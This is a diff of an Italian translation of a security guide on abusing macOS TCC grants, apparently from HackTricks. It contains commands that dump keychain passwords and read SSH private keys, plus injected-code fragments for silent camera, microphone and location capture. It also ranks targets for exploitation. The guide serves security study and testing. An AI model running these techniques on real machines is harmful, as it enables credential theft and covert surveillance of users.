@@ -1,13 +1,13 @@
-# Furto di credenziali e dati su macOS tramite permessi TCC
+# Furto di credenziali e dati tramite permessi TCC di macOS
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 ## Panoramica
 
-macOS TCC (Transparency, Consent, and Control) protegge l'accesso ai dati sensibili dell'utente. Quando un attaccante **compromette un binary che dispone già di grants TCC**, eredita tali permessi. Questa pagina documenta il potenziale di exploitation di ciascun permesso TCC correlato al furto di dati.<sup>[[2]](#references)</sup>
+macOS TCC (Transparency, Consent, and Control) protegge l'accesso ai dati sensibili degli utenti. Quando un attaccante **compromette un binary che dispone già di TCC grants**, eredita quei permessi. Questa pagina documenta il potenziale di exploitation di ciascun permesso TCC correlato al furto di dati.<sup>[[2]](#references)</sup>
 
 > [!WARNING]
-> Il code injection in un binary con grants TCC (tramite DYLD injection, dylib hijacking o task port) **eredita silenziosamente tutti i relativi permessi TCC**. Non viene mostrata alcuna richiesta o verifica aggiuntiva quando lo stesso processo legge dati protetti.
+> La code injection in un binary con TCC grants (tramite DYLD injection, dylib hijacking o task port) **eredita silenziosamente tutti i relativi permessi TCC**. Quando lo stesso processo legge dati protetti, non viene visualizzato alcun prompt aggiuntivo né viene eseguita alcuna verifica.<sup>[[4]](#references)</sup>
 
 ---
 
@@ -17,14 +17,14 @@ macOS TCC (Transparency, Consent, and Control) protegge l'accesso ai dati sensib
 
 Il Keychain di macOS memorizza:
 - **Password Wi-Fi** — tutte le credenziali delle reti wireless salvate
-- **Password dei siti web** — password di Safari, Chrome (quando utilizza il Keychain) e altri browser
-- **Password delle applicazioni** — account e-mail, credenziali VPN, token di sviluppo
+- **Password dei siti web** — password di Safari, Chrome (quando utilizza il Keychain) e di altri browser
+- **Password delle applicazioni** — account email, credenziali VPN, token di sviluppo
 - **Certificati e chiavi private** — code signing, TLS client, crittografia S/MIME
 - **Note sicure** — segreti memorizzati dall'utente
 
 ### Entitlement: `keychain-access-groups`
 
-Gli elementi del Keychain sono organizzati in **access groups**. L'entitlement `keychain-access-groups` di un'applicazione elenca i gruppi a cui può accedere:<sup>[[1]](#references)</sup>
+Gli elementi del Keychain sono organizzati in **gruppi di accesso**. L'entitlement `keychain-access-groups` di un'applicazione elenca i gruppi a cui può accedere:<sup>[[1]](#references)</sup>
 ```xml
 <key>keychain-access-groups</key>
 <array>
@@ -34,7 +34,7 @@ Gli elementi del Keychain sono organizzati in **access groups**. L'entitlement `
 <string>InternetAccounts</string>       <!-- Internet account passwords -->
 </array>
 ```
-### Exploitation
+### Sfruttamento
 ```bash
 # Find binaries with broad keychain access groups
 sqlite3 /tmp/executables.db "
@@ -50,7 +50,7 @@ security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100
 security find-generic-password -s "Wi-Fi" -w 2>&1
 security find-internet-password -s "github.com" 2>&1
 ```
-### Code Injection → Furto del Keychain
+### Code Injection → Furto del portachiavi
 ```objc
 // Injected dylib code — runs with the target's keychain groups
 #import <Security/Security.h>
@@ -85,13 +85,13 @@ NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8Stri
 
 ### Exploitation
 
-Un binary con un'autorizzazione TCC per la fotocamera (tramite `kTCCServiceCamera` o l'entitlement `com.apple.security.device.camera`) può acquisire foto e video:
+Un binary con un TCC grant per la fotocamera (tramite `kTCCServiceCamera` o l’entitlement `com.apple.security.device.camera`) può acquisire foto e video:
 ```bash
 # Find camera-authorized binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
 ```
-### Cattura silenziosa
+### Silent Capture
 ```objc
 // Injected into a camera-entitled process
 #import <AVFoundation/AVFoundation.h>
@@ -125,13 +125,13 @@ fromConnection:(AVCaptureConnection *)connection {
 @end
 ```
 > [!TIP]
-> A partire da **macOS Sonoma**, l'indicatore della fotocamera nella barra dei menu è persistente e non può essere nascosto programmaticamente. Nelle **versioni precedenti di macOS**, una breve acquisizione potrebbe non produrre un indicatore visibile.
+> A partire da **macOS Sonoma**, l'indicatore della fotocamera nella barra dei menu è permanente e non può essere nascosto programmaticamente. Nelle **versioni precedenti di macOS**, una breve acquisizione potrebbe non produrre un indicatore visibile.
 
 ---
 
 ## Accesso al microfono (kTCCServiceMicrophone)
 
-### Sfruttamento
+### Exploitation
 
 L'accesso al microfono acquisisce tutto l'audio dal microfono integrato, dalle cuffie o dai dispositivi di input audio collegati:
 ```bash
@@ -139,7 +139,7 @@ L'accesso al microfono acquisisce tutto l'audio dal microfono integrato, dalle c
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
 ```
-### Attacco: Ambient Recording
+### Attack: Registrazione ambientale
 ```objc
 // Injected into a mic-entitled process
 #import <AVFoundation/AVFoundation.h>
@@ -173,7 +173,7 @@ dispatch_get_main_queue(), ^{
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
 ```
-### Tracciamento continuo
+### Monitoraggio continuo
 ```objc
 #import <CoreLocation/CoreLocation.h>
 
@@ -209,7 +209,7 @@ loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
 |---|---|---|
 | `kTCCServiceAddressBook` | `Contacts.framework` | Nomi, email, numeri di telefono, indirizzi |
 | `kTCCServiceCalendar` | `EventKit` | Riunioni, partecipanti, luoghi |
-| `kTCCServicePhotos` | `Photos.framework` | Foto, screenshot, metadati sulla posizione |
+| `kTCCServicePhotos` | `Photos.framework` | Foto, screenshot, metadati di posizione |
 ```bash
 # Find authorized binaries for each service
 for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
@@ -253,20 +253,20 @@ WHERE iCloudAccs = 1
 ORDER BY privileged DESC;"
 ```
 > [!CAUTION]
-> Compromettere un binary con entitlement iCloud estende l'attacco da un **singolo dispositivo all'intero ecosistema Apple**: altri Mac, iPhone, iPad e Apple Watch. La sincronizzazione del Portachiavi iCloud rende accessibili le password di tutti i dispositivi.
+> Compromettere un binary con entitlement iCloud estende l'attacco da un **singolo dispositivo all'intero ecosistema Apple**: altri Mac, iPhone, iPad, Apple Watch. La sincronizzazione di iCloud Keychain significa che le password di tutti i dispositivi sono accessibili.
 
 ---
 
-## Accesso completo al disco (kTCCServiceSystemPolicyAllFiles)
+## Full Disk Access (kTCCServiceSystemPolicyAllFiles)
 
-### Il permesso TCC più potente
+### La permission TCC più potente
 
-L'accesso completo al disco consente di leggere **ogni file del sistema**, inclusi:
+Full Disk Access concede la capacità di lettura di **ogni file sul sistema**, inclusi:
 - I dati di altre app (Messaggi, Mail, cronologia di Safari)
-- I database TCC (che rivelano tutti gli altri permessi)
-- Le chiavi SSH e la configurazione
-- I cookie dei browser e i token di sessione
-- I database e le cache delle applicazioni
+- I database TCC (rivelando tutte le altre permission)
+- Chiavi e configurazione SSH
+- Cookie del browser e token di sessione
+- Database e cache delle applicazioni
 ```bash
 # Find FDA-granted binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -280,25 +280,25 @@ cat ~/.ssh/id_rsa                           # SSH private key
 ```
 ---
 
-## Exploitation Priority Matrix
+## Matrice delle priorità di exploitation
 
-Quando si valutano i binary con permessi TCC iniettabili, stabilire le priorità in base al valore dei dati:
+Quando valuti i binary con permessi TCC iniettabili, stabilisci le priorità in base al valore dei dati:
 
 | Priorità | Permesso TCC | Perché |
 |---|---|---|
 | **Critica** | Full Disk Access | Accesso a tutto |
 | **Critica** | TCC Manager | Può concedere qualsiasi permesso |
-| **Alta** | Keychain Access Groups | Tutte le password memorizzate |
-| **Alta** | iCloud Account Access | Compromissione di più dispositivi |
+| **Alta** | Keychain Access Groups | Tutte le password archiviate |
+| **Alta** | iCloud Account Access | Compromissione multi-dispositivo |
 | **Alta** | Input Monitoring (ListenEvent) | Keylogging |
-| **Alta** | Accessibility | Controllo della GUI, auto-concessione dei permessi |
+| **Alta** | Accessibility | Controllo della GUI, self-granting |
 | **Media** | Screen Capture | Acquisizione di dati visivi |
 | **Media** | Camera + Microphone | Sorveglianza |
-| **Media** | Contacts + Calendar | Dati per social engineering |
+| **Media** | Contacts + Calendar | Dati per il social engineering |
 | **Bassa** | Location | Tracciamento fisico |
 | **Bassa** | Photos | Dati personali |
 
-## Enumeration Script
+## Script di enumerazione
 ```bash
 #!/bin/bash
 echo "=== TCC Credential Theft Surface Audit ==="
@@ -322,11 +322,10 @@ echo -e "\n[*] iCloud-entitled binaries:"
 sqlite3 /tmp/executables.db "
 SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
 ```
-## Riferimenti
+## References
 
-- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
+- [1] [Apple Developer — Servizi Keychain](https://developer.apple.com/documentation/security/keychain_services)
 - [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
-- [3] [OBTS v5.0 — "What Happens on your Mac, Stays on Apple's iCloud?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
-- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
-
+- [3] [OBTS v5.0 — "Cosa succede sul tuo Mac rimane sull'iCloud di Apple?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+- [4] [Objective-See — Sfruttamento di TCC](https://objective-see.org/blog/blog_0x4C.html)
 {{#include ../../../../banners/hacktricks-training.md}}
